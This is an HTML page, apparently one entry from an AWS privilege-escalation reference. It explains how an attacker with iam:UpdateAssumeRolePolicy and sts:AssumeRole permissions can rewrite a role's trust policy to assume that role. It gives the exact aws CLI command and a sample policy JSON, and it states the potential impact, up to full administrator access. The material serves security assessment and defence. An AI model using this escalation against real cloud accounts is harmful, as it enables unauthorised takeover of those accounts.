@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Updating the AssumeRolePolicyDocument of a Role</title>
+</head><body><b>Description: </b>An attacker with the <u>iam:UpdateAssumeRolePolicy</u>&nbsp;and <u>sts:AssumeRole</u>&nbsp;permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.<br/>
+&nbsp;<br/>
+An example command to exploit this method might look like this:<br/>
+<i>aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json</i><br/>
+&nbsp;<br/>
+Where the policy looks like the following, which gives the user permission to assume the role:<br/>
+&nbsp;<br/>
+{<br/>
+“Version”: “2012-10-17”,<br/>
+“Statement”: [<br/>
+{<br/>
+“Effect”: “Allow”,<br/>
+“Principal”: {<br/>
+“AWS”: “arn:aws:iam::my_account_id:user/my_username”<br/>
+},<br/>
+“Action”: “sts:AssumeRole”<br/>
+}<br/>
+]<br/>
+}<br/>
+<b><br/>
+</b><b>Potential Impact: </b>This would give the attacker the privileges that are attached to any role in the account, which could range from no privilege escalation to full administrator access to the account.<br/>
+&nbsp; &nbsp;</body></html>
